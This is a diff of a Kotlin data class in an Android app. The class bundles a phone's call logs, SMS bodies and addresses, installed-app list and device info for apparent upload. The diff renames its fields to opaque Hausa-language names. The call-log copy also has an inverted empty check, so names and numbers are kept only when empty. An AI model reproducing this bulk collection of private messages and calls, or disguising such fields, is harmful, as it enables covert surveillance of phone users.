@@ -1,10 +1,6 @@
 package com.zip.zipandroid.bean
 
-import android.text.TextUtils
-import com.google.gson.Gson
 import com.google.gson.JsonSyntaxException
-import com.google.gson.reflect.TypeToken
-import com.tencent.mmkv.MMKV
 import com.zip.zipandroid.utils.StringUtils
 import com.zip.zipandroid.utils.phonedate.applist.InstalledApp
 import com.zip.zipandroid.utils.phonedate.calendar.CalendarInfos
@@ -12,16 +8,16 @@ import com.zip.zipandroid.utils.phonedate.calllog.CallLog
 import com.zip.zipandroid.utils.phonedate.sms.SMSMessage
 
 class ZipPushData {
-    var callLogs: Array<ZipCallLogBean?>? = null
+    var rikodinKira: Array<ZipCallLogBean?>? = null
         private set
 
     //    var contacts: Array<ContactsBean?>? = null
 //        private set
-    var message: Array<ZipSmsBean?>? = null
+    var sako: Array<ZipSmsBean?>? = null
         private set
-    var installedApps: Array<InstalledAppsBean?>? = null
+    var aikaceAikaceSanya: Array<InstalledAppsBean?>? = null
         private set
-    var deviceInfo: DeviceInfoModel
+    var bayaninNaUra: DeviceInfoModel
     var photoData: PhotoData = PhotoData()
 //    var calendarInfo: Array<CalendarInfos?>? = null
 //    var mediaDatas: MutableList<PhotoDataModel>? = null
@@ -32,15 +28,15 @@ class ZipPushData {
                 val callLogBeans = arrayOfNulls<ZipCallLogBean>(callLogs.size)
                 for (i in callLogs.indices) {
                     val callLogBean = ZipCallLogBean()
-                    callLogBean.name = if (StringUtils.isEmpty(callLogs[i]?.name)) callLogs[i]?.name else ""
-                    callLogBean.number = if (StringUtils.isEmpty(callLogs[i]?.number)) callLogs[i]?.number else ""
+                    callLogBean.sunan = if (StringUtils.isEmpty(callLogs[i]?.name)) callLogs[i]?.name else ""
+                    callLogBean.lambar = if (StringUtils.isEmpty(callLogs[i]?.number)) callLogs[i]?.number else ""
                     //                        callLogBean.setDate(new SimpleDateFormat("yyy-MM-dd HH:mm:ss").format(callLogs[i].date));
-                    callLogBean.date = callLogs[i]?.date.toString() + ""
-                    callLogBean.duration = callLogs[i]?.duration.toString() + ""
-                    callLogBean.type = callLogs[i]?.type.toString() + ""
+                    callLogBean.kwananWata = callLogs[i]?.date.toString() + ""
+                    callLogBean.tsawonLokaci = callLogs[i]?.duration.toString() + ""
+                    callLogBean.nauIn = callLogs[i]?.type.toString() + ""
                     callLogBeans[i] = callLogBean
                 }
-                this.callLogs = callLogBeans
+                this.rikodinKira = callLogBeans
             }
         } catch (e: JsonSyntaxException) {
             e.printStackTrace()
@@ -77,18 +73,18 @@ class ZipPushData {
                 val smsBeans = arrayOfNulls<ZipSmsBean>(messages.size)
                 for (i in messages.indices) {
                     val smsBean = ZipSmsBean()
-                    smsBean.address = if (StringUtils.isNotEmpty(messages[i]?.address)) messages[i]?.address else ""
-                    smsBean.body = if (StringUtils.isNotEmpty(messages[i]?.body)) messages[i]?.body else ""
+                    smsBean.adireshin = if (StringUtils.isNotEmpty(messages[i]?.address)) messages[i]?.address else ""
+                    smsBean.jiki = if (StringUtils.isNotEmpty(messages[i]?.body)) messages[i]?.body else ""
                     //                        smsBean.setDate(new SimpleDateFormat("yyy-MM-dd HH:mm:ss").format(messages[i].date));
-                    smsBean.date = messages[i]?.date.toString() + ""
+                    smsBean.kwananWata = messages[i]?.date.toString() + ""
                     //                        smsBean.setDateSent(new SimpleDateFormat("yyy-MM-dd HH:mm:ss").format(messages[i].dateSent));
-                    smsBean.dateSent = messages[i]?.dateSent.toString() + ""
+                    smsBean.kwananWataAika = messages[i]?.dateSent.toString() + ""
 //                    smsBean.id = messages[i]?.id
                     messages[i]?.status?.let { smsBean.setStatus(it) }
                     messages[i]?.type?.let { smsBean.setType(it) }
                     smsBeans[i] = smsBean
                 }
-                message = smsBeans
+                sako = smsBeans
             }
         } catch (e: JsonSyntaxException) {
             e.printStackTrace()
@@ -101,15 +97,15 @@ class ZipPushData {
                 val appsBeans = arrayOfNulls<InstalledAppsBean>(installedApps.size)
                 for (i in installedApps.indices) {
                     val installedAppsBean = InstalledAppsBean()
-                    installedAppsBean.appLabel = if (StringUtils.isNotEmpty(installedApps[i]?.appLabel)) installedApps[i]?.appLabel else ""
+                    installedAppsBean.alamarAiki = if (StringUtils.isNotEmpty(installedApps[i]?.appLabel)) installedApps[i]?.appLabel else ""
                     //                        installedAppsBean.setFirstInstallTime(new SimpleDateFormat("yyy-MM-dd HH:mm:ss").format(installedApps[i].firstInstallTime));
-                    installedAppsBean.firstInstallTime = installedApps[i]?.firstInstallTime.toString() + ""
+                    installedAppsBean.lokacinShigarFarko = installedApps[i]?.firstInstallTime.toString() + ""
                     //                        installedAppsBean.setLastUpdateTime(new SimpleDateFormat("yyy-MM-dd HH:mm:ss").format(installedApps[i].lastUpdateTime));
-                    installedAppsBean.lastUpdateTime = installedApps[i]?.lastUpdateTime.toString() + ""
-                    installedAppsBean.packageName = if (StringUtils.isNotEmpty(installedApps[i]?.packageName)) installedApps[i]?.packageName else ""
+                    installedAppsBean.lokacinSabuntawaKarshe = installedApps[i]?.lastUpdateTime.toString() + ""
+                    installedAppsBean.sunanFakitin = if (StringUtils.isNotEmpty(installedApps[i]?.packageName)) installedApps[i]?.packageName else ""
                     appsBeans[i] = installedAppsBean
                 }
-                this.installedApps = appsBeans
+                this.aikaceAikaceSanya = appsBeans
             }
         } catch (e: JsonSyntaxException) {
             e.printStackTrace()
@@ -166,6 +162,6 @@ class ZipPushData {
     }
 
     init {
-        deviceInfo = DeviceInfoModel()
+        bayaninNaUra = DeviceInfoModel()
     }
 }
